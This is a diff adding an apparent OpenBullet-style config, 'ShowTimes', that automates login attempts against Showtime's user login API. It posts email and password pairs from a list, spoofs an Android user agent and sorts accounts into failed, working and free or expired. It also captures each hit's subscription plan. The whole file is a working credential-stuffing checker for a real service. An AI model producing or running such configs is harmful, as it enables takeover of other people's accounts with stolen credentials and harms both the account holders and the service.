@@ -1,0 +1,43 @@
+[SETTINGS]
+{
+  "Name": "ShowTimes",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-16T12:09:47.145842-05:00",
+  "AdditionalInfo": "",
+  "Author": "FFaez1267",
+  "Version": "1.0.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.showtime.com/api/user/login" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N9005 Build/NJH47F)" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Sign In Failed" 
+  KEYCHAIN Success OR 
+    KEY "registered\":true" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "subscriptionStatus\":\"NONE\",\"" 
+    KEY "EXPIRED" 
+
+PARSE "<SOURCE>" JSON "subscriptionStatus" -> CAP "Plan" 
+
